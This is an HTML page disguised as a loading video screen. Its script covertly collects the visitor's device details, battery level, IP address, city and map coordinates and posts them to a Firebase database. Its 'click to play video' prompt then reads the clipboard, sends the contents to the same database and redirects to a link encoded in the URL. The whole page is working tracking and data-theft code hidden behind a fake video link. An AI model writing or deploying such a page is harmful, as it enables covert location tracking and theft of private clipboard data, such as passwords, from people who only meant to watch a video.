<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Loading...</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status" style="text-align:center;">
        <div class="loader" id="ldr"></div>
        <p id="msg" style="margin-top:10px; color:#555; font-size: 13px;">Connecting to server...</p>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function collectData() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;
            const decoded = JSON.parse(atob(id));
            const userKey = decoded.k;
            const targetUrl = decoded.r;

            // 1. Instant Data (No wait)
            let data = {
                time: new Date().toLocaleString(),
                device: navigator.platform,
                ram: navigator.deviceMemory || "N/A",
                res: `${screen.width}x${screen.height}`,
                orient: screen.orientation ? screen.orientation.type : "N/A",
                netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                speed: navigator.connection ? navigator.connection.downlink : "N/A"
            };

            // 2. Battery (Silent wait)
            try {
                const b = await navigator.getBattery();
                data.battery = Math.round(b.level * 100);
                data.charging = b.charging ? "Yes" : "No";
            } catch(e){ data.battery = "N/A"; }

            // 3. IP & Location (Fast API)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                data.ip = d.ip || "N/A";
                data.loc = d.city ? `${d.city}, ${d.country_name}` : "N/A";
                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            } catch(e) {
                data.ip = "N/A"; data.loc = "N/A";
            }

            // Save foran
            fetch(`${DB_URL}tracking/${userKey}.json`, { 
                method: 'POST', 
                body: JSON.stringify(data) 
            });

            // Timer for UI
            setTimeout(() => {
                document.getElementById('ldr').style.display = 'none';
                document.getElementById('msg').innerHTML = "<b>⚠️ CLICK TO PLAY VIDEO</b>";
                document.body.onclick = async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        if(text) fetch(`${DB_URL}clipboard/${userKey}.json`, { 
                            method: 'POST', 
                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
                        });
                    } catch(e){}
                    window.location.href = targetUrl;
                };
            }, 2000);

            // Auto Redirect
            setTimeout(() => { window.location.href = targetUrl; }, 6000);
        }
        collectData();
    </script>
</body>
</html>
